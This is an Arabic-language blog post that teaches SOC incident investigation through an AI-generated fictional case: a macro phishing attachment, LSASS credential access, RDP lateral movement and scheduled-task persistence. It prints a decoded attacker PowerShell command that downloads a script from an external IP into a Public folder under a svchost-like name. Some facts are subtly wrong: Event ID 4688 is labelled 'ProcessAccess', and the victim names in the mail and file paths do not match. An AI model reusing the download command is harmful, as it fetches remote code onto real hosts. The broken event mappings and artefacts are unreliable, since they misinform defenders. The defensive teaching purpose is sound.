# مش حوار لكن جريمة جديدة: INCIDENT 1

**Author: VampireXRAY**

بسم الله، فقره جديدة من حوارات الـ Cyber Security، هنمسك **INCIDENT** ونفهم كويس نعملها **Investigation** ازاي (مع اختلاف الـ Mindset لكل analyst، لكن دي الـ Mindset بتاعتي حاليًا، وأكيد أي حد عنده تعليق يساعدني يتفضل طبعًا).

هنكتفي في هذا البوست بسيناريو وهمي طلبت من الـ AI يعمله عشان أشوف أفضل طريقة كتابة ازاي للبوست، ومن المرة الجاية نبدأ في ريبورتات حقيقية.

طولت عليكم، نخش في الموضوع.

---

## البداية

الساعة **2:14** بليل، الـ EDR في شركة ما بعت Alert بالشكل دا:

> "Suspicious PowerShell execution — the process used the `-EncodedCommand` parameter"

والجهاز الي مبعوت منه الـ Alert لموظف سيلز اسمه **أحمد**.

أحمد بيبيع لمين وحده بأربعة مليون الساعة 2 بليل؟

هبدأ أفكر عادي بالمنطق، الوقت صعب جدًا، ثانيًا حتى لو الموظف بافتراض لأي سبب، فا اي الي شغل PowerShell عنده؟ في العادي بيكون صلاحية يوزر مقفولة عنده دا.

طب مش ممكن يكون مثلًا **IT Admin** عنده شيفت مسائي وبيعدل حاجة في الأجهزة؟ مهو مسموح لبعضهم استخدام الـ PowerShell عادي؟

انتي بتبرريله؟

هيودينا لأهم مقولة في عالم الجرايم عمومًا وهي إن **المتهم بريء حتى تثبت إدانته**.

حتى في السوك؟ **حتى في السوك.**

من الآخر، والجملة الي لخصت فيها مجال الـ SOC كله:

> **إخلق مبررات وإثبت عكسها** (بس طبعًا في حدود هتتعلمها بالممارسة)

احنا مش قاعدين طول اليوم على Alert واحد يعني، بس المختصر: لو في أي استخدام شرعي للي انت شايفه، دايمًا حاول تثبت انه ينفع، ولا فعلًا دا حاجة malicious.

أنا كدا جمعت عندي سببين أقدر أبدأ فيهم Investigation، لهم فرضية ممكن تكون legit عادي أو شرعية.

---

## نبدأ الـ Investigation

بسم الله نبدأ بإيه، قولنا احنا شاكين مين الي سجل على الجهاز، IT admin ولا أحمد ولا مين؟

نبدأ نراجع logs تسجيل الدخول قبل الساعة 2 وربع كدا، ونشوف الجلسة اللي شغّلت PowerShell دي اشتغلت إزاي؟

نشوف log events تسجيل الدخول (شرحنا القصة دي في البوست الي فات، ارجعوله):

**Event ID 4624 (Successful Logon)**

عندنا بقا أهم حاجة في الـ Event ID دا هو الـ **logon type** الي بيوضحلي الـ access تم على الجهاز إزاي، سواء اليوزر أو حد تاني، وأهم تلات أنواع:

- **Type 2** = Interactive (حد قاعد فعليًا قدام الجهاز)
- **Type 3** = Network
- **Type 10** = RemoteInteractive (RDP) *(بروتوكول يستخدم في الأغلب remote connection)*

**النتيجة:** لقينا `Logon Type = 10` (RDP)

استهدى بالله، مش قولنا ممكن IT admin وسجل على الجهاز ريموتلي عادي؟

طب لو الـ IT، أكيد IP معروف صح؟ وسجل مثلًا قبل كدا على الجهاز مرة على الأقل؟

سيرش على SIEM، لقينا IP داخلي فعلًا الي سجل على الجهاز، **لكن بدون أي سجل سابق للاتصال بجهاز الموظف ده**.

بسيرش على الـ IP في الـ EDR، لقيته تبع جهاز تاني لحد في السيلز! (دا كلنا بقا)

يتم **Containment** فورًا لكل VLAN السيلز كدا، اتأكدنا ان في **lateral movement** غير مصرح بيه.

في بعض الـ L1 بيتم Escalation وشغلك بينتهي هنا.

لكن لو هنكمل؟

---

## نكمل: فك الـ PowerShell Command

هبدأ اشوف الـ PowerShell command الي جه في الـ EDR.

كان طبعًا Encoded، على CyberChef وبعدين:

```powershell
$s = New-Object Net.WebClient
$s.DownloadFile('http://185.174.55.69/p.ps1', 'C:\Users\Public\svchost.ps1')
```

اممم، يعني قولتلي download فايل باسم شبه اسم process legit مسؤولة عن تشغيل خدمات الويندوز، من الـ IP الي شوفنا reputation بتاعته طلع **malicious** على VT. قولتلي.

طب جه منين؟ احنا قولنا ان جهاز تاني في السيلز هو الي سجل دخول، طب الـ Attacker وصل إزاي للجهاز الأولاني؟

---

## نفتش في جهاز المصدر

هبدأ أفتش في جهاز المصدر.

ببص على لوجز جهاز المصدر، لقيت ان في لوجاية RDP فعلًا للجهاز الي اتبعتلي منه الـ alert.

طب وجاب منين اليوزر والباسورد للجهاز الأولاني؟

شرحنا المرة الي فاتت process الـ AD Attacks، وقولنا وقتها ان بنجيب الـ credentials دامب من الميموري، بس مقولناش بتكون موجودة فين.

في `lsass.exe`، الي بتحتفظ ببيانات أي تسجيل دخول على الأجهزة. بالظبط دي أول حاجة هتيجي في بالنا نسيرش عليها.

طيب نسيرش في الـ SIEM، هنلاقي log كدا:

```
Event ID: 4688 (ProcessAccess)
Time: 11:41:03 PM
SourceImage: C:\Users\Public\update_svc.exe
TargetImage: C:\Windows\System32\lsass.exe
GrantedAccess: 0x1010
```

و`0x1010` معناها قراءة من الميموري.. بالظبط.

طب إيه المسار دا كمان، `Public\update_svc.exe`؟ يعني Update process، ماشي، ممكن يكون فعلًا في update (فاكر جملتنا: اخلق مبررات؟).

بس الي المفروض عارفينه: إيه خدمات الويندوز موجودة في مسارين، `System32` أو `System`.. إنما نلاقيه في Public path!

طب جه منين `update_svc.exe`؟ هل ممكن اتحمل؟

---

## نتتبع الـ Process Creation

نسيرش عن Process Creation Log له، ونعرف عبارة عن إيه:

```
Event ID: 1 (Process Creation on Sysmon)
CommandLine: "C:\Users\Public\update_svc.exe"
ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
ParentCommandLine: "WINWORD.EXE" /n "C:\Users\mona.adel\Downloads\Vendor_Invoice_Update.docm"
```

لقينا اللوجاية بتقول انه اتفتح من `WINWORD.EXE`.

ملف وورد، ماشي، ممكن لسه في نطاق الـ Legit، بس لما نعرف منين:

`\Downloads\Vendor_Invoice_Update.docm`

من فايل مايكرو اتحمل؟ (`.docm` يعني مايكرو). خدت الصتمة.

منين طاب؟

سيرش في system logs باسم الفايل، `EventID:15` بيرمز لستريم الي فيه معلومات زيادة عن الفايل ضافها الويندوز، وجواها parameter اسمه **Zone.Identifier**، دي بتحدد الملف اتحمل من برا ولا من local ولا cloud.

```
Event ID: 15
TargetFilename: C:\Users\mona.adel\Downloads\Vendor_Invoice_Update.docm
Hash: SHA256=...
Contents: [ZoneTransfer]
ZoneId=3
ReferrerUrl=https://mail.google.com/...
```

عندي `ZoneId=3` من `mail[.]google[.]com`.

اممم، phishing email يعني ممكن..

---

## نرجع للـ Mail Gateway

نسيرش في الـ Mail Gateway نشوف الـ mail.

لقينا mail فيه نفس الـ Hash بتاع المايكرو:

```
Recipient: Amr.adel@delta.corp
Subject: Updated Vendor Invoice — Please Review
Attachment: Vendor_Invoice_Update.docm
Attachment Hash: SHA256=b7e2a9...f41c (نفس الهاش اللي طلع في Event ID 1)
SPF: Fail
DKIM: Fail
DMARC: Fail
```

فشل في كل بروتوكولات Mail reputation، بس عدّى لإن في مشكلة في rules الـ Mail Gateway.

طيب، عايزين نعرف بالظبط آخر المايكرو دا إيه، عشان مرحلة الـ **Eradication** بعدين.

هناخد الهاش بتاع المايكرو، نعمله **Static Analysis** (VT) و**Dynamic Analysis** (Hybrid أو Any.run).

هنلاقي انه بيحمّل بايلود من الـ IP الخارجي الي شوفناه في الأول، وكمان بيعمل **Scheduled Task**.

---

## الـ Persistence

نسيرش بـ `Event ID: 4698` (Schedule Task) كدا في اللوجز، لقينا فعلًا حاجة:

```
Task Content:
  <Exec>
    <Command>C:\Users\Public\update_svc.exe</Command>
  </Exec>
  <Trigger>
    <LogonTrigger>
    <Repetition><Interval>PT10M</Interval></Repetition>
```

`LogonTrigger` (كل عشر دقايق اطلع على الإنترنت)، على `MicrosoftEdgeUpdateTaskMachine`.

ودي قولنا legit عادي، بس مش Public زي ما قولنا! بالظبط هو نفس Path الي شوفناه.

---

## هل في تسريب بيانات؟

طب عايزين نعرف الـ Attacker بعد دا كله عمل إيه؟ هل في تسريب بيانات مثلًا، أو حمّل حاجة أكبر؟

نشوف على الـ Firewall والـ EDR في data exfiltration ولا لأ.

لقيت:

```
185.174.55.69: Outbound bytes = 4.2 KB
```

تسريب بيانات بسيطة من جهاز عمر (الجهاز المصدر) الي كان عليه الميل، ممكن يكون مجرد beacon بس (بيسمع الجهاز انه على الخط مش أكتر).

ولقيت برضو:

```
185.174.55.69: Connection attempt to download p.ps1 → BLOCKED by EDR
```

من الجهاز الي أصلًا جالي بيه الـ alert.

دا كان مكمل، بس ربنا سترها.

---

## الخاتمة

كدا خلصنا، الحمد لله، فاضل بس نعرف كم عدد الأجهزة المصابة غير أحمد وعمر.

بنمسك بقا الـ IP دا، بنعمله حاجة اسمها **Retro IOC**، بنشوفه على باقي الأجهزة، هل له أثر على باقي أجهزة الـ Sales ولا لأ.

وبس كدا.

*إن أصبت فهو من عند الله، وإن أخطأت فهو من نفسي والشيطان* :)
